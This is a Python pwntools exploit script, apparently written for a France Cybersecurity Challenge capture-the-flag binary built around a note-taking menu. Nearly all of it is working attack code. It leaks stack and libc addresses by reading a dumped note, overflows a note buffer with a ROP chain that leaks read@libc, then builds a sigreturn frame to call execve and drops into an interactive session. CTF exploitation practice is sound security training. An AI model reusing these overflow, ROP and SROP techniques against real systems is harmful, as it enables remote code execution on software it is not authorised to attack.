#!/usr/bin/python3.9
from pwn import *

context.terminal = '/usr/bin/kitty'

if not args.BLIND:
    context.binary = elfexe = ELF('./bin') #FIXME
    libc = ELF(elfexe.libc.path) #FIXME

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    elf_path = elfexe.path
    if args.REMOTE:
        remote_server = 'challenges.france-cybersecurity-challenge.fr'   #FIXME
        remote_port = 2109              #FIXME

        if args.SSH:
            s = ssh('app-systeme-ch8', remote_server, remote_port, 'app-systeme-ch8')
            if args.GDB:
                if not args.BLIND:
                    return gdb.debug([elf_path] + argv, gdbscript, elfexe.path, ssh=s, *a, *kw)
                else:
                    return gdb.debug([elf_path] + argv, gdbscript, ssh=s, *a, *kw)
            else:
                target = s.process([elf_path] + argv, *a, **kw)
        else:
            target = remote(remote_server, remote_port)
    else:
        if args.GDB:
            if not args.BLIND:
                return gdb.debug([elf_path] + argv, gdbscript, elfexe.path, *a, *kw)
            else:
                return gdb.debug([elf_path] + argv, gdbscript, *a, *kw)
        else:
            target = process([elf_path] + argv, *a, **kw)
    return target

gdbscript = '''
# init-gef
# target record-full # Not supported with AVX instructions yet

b *newNote+160
# b *main
# command
#     printf "argv ptr: %p\\n",$rsi
# end

# continue
'''.format(**locals())
if args.GDB:
    log.info('Using gdb script:\n'+gdbscript)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def parse_dump(dump):
    dico = {}
    for i in dump:
        dico[int(i.split(" ")[0][1:-1], 16)] = ((int("".join(i.split(" ")[1:9][::-1]), 16)), (int("".join(i.split(" ")[9:17][::-1]), 16)))

    return dico


arguments = ['50']
r = start(arguments)

data = r.recvuntil(b'ote\n0. Exit\n>>> ')
session = data.decode().split("\n")[0].split(" ")[-1].split("/")[-2]
print("SESSION :", session)

r.sendline(b'1')
data = r.recvuntil(b'ontent length: \n')
note = data.decode().split("\n")[0].split(" ")[-1]
print("NOTE :", note)

r.sendline(b'176')
data = r.recvuntil(b'Content: \n')
print(data.decode())
r.sendline(b'AAAAAAAA')
data = r.recvuntil(b'ote\n0. Exit\n>>> ')
print(data.decode())
r.sendline(b'2')
data = r.recvuntil(b't filename:\n>>> ')
print(data.decode())

r.sendline(f'{session}/{note}'.encode())
data = r.recvuntil(b'ote\n0. Exit\n>>> ')
dump = parse_dump(data.decode().split("\n")[1:12])
bak = data.decode().split("\n")[1:12]
for i in bak:
    print(i)

addr_1 = dump[0x30][0]-0x1b0
print("STACK Leak :", hex(addr_1))

addr_2 = dump[0xa0][1]+0x251d6
print("LIBC Leak :", hex(addr_2))


main_ret = 0x00401962
pop_rdi  = 0x40135e
pop_rsp  = 0x401871
pop_rsi  = 0x40135c     # pop rsi; pop r15; ret


#########   ret2main   ###############
r.sendline(b'1')
data = r.recvuntil(b'ontent length: \n')
print(data.decode())
r.sendline(b'152')
data = r.recvuntil(b'Content: \n')
print(data.decode())

payload = b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
payload += p64(0x32)
payload += p64(pop_rdi)
payload += p64(elfexe.got['read'])
payload += p64(elfexe.sym['puts'])
payload += p64(elfexe.sym['newNote'])
#payload += p64(main_ret)

r.sendline(payload)
data = r.recvline()
libc_read = u64(data[:6]+b'\x00\x00')
print("read@libc :", hex(libc_read))
######################################



syscall_ret = libc_read+15  # syscall ; cmp rax, -4096 ; ja <...> ; ret
mov_rax     = libc_read+97  # mov rax,[rsp+0x8]; add rsp,0x28; ret


#########   ret2main   ###############
data = r.recvuntil(b'ontent length: \n')
print(data.decode())
r.sendline(b'252')
data = r.recvuntil(b'Content: \n')
print(data.decode())

frame = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve
frame.rsp = addr_1+0x70
frame.rdi = addr_1+0x78     # pointer to /bin/ls
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
frame.rip = elfexe.sym['newNote']

srop = bytes(frame)[13*8:]

payload = b''
payload += p64(mov_rax)
payload += p64(0x1337)
payload += p64(0x0f)
payload += b'A'*0x10
payload += p64(syscall_ret)
payload += p64(pop_rsp)
payload += p64(addr_1+0x88)
payload += b'A'*0x28
payload += p64(pop_rsp)
payload += p64(addr_1)
payload += b'/bin/ls\x00'
payload += p64(addr_1+0x78)
payload += p64(pop_rsp)
payload += p64(addr_1+0x28)
payload += srop

r.sendline(payload)
######################################

r.interactive()
r.close()
